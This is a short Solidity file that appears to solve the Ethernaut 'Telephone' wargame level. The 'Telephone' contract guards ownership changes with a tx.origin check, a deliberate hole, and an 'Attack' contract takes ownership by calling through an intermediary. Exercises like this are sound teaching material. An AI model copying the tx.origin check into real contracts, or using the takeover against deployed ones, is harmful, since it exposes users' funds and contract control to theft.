// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract Attack {
    Telephone public tele;

    constructor(Telephone _tele) {
        tele = _tele;
    }

    function attackTele() public {
        tele.changeOwner(msg.sender);
    }

}